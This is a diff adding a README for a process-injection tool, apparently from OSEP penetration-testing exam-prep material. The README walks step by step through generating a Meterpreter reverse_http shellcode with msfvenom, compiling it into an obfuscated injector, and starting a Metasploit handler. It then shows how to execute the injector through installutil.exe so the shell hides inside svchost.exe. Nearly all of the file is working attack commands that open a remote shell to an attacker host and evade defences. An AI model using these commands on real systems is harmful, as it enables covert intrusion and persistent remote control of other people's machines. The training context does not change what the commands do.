@@ -1,0 +1,30 @@
+# OSEP InstallUtil Remote Process Injector (Surgical Edition)
+
+This version injects shellcode into a remote `svchost.exe` process for stealth and persistence. It uses "Surgical Reflection" to hide API calls and includes automated XOR+ROT encryption.
+
+### STEP 1: Generate Shellcode
+Generate your payload in raw format (.bin). 
+
+# Example: Meterpreter Reverse HTTP
+$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin
+
+### STEP 2: Compile
+Use the PayloadCompiler with the --shellcode flag.
+
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/InstallUtilBypass/ProcessInjector/InstallUtil-Inject.cs \
+    -m classic \
+    --obfuscate aggressive \
+    --shellcode shellcode.bin \
+    -o ProcessInjector.exe
+
+### STEP 3: Setup the Handler (On Kali)
+$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_http; set LHOST <IP>; set LPORT <PORT>; set EXITONSESSION false; exploit -j"
+
+### STEP 4: Execute on Target
+Transfer ProcessInjector.exe to the target and execute via installutil.exe:
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U ProcessInjector.exe
+
+---
+NOTE: The injector will automatically find a suitable `svchost.exe` process and inject the decrypted shellcode. If the execution finishes, the shell will remain active inside the `svchost.exe` process.
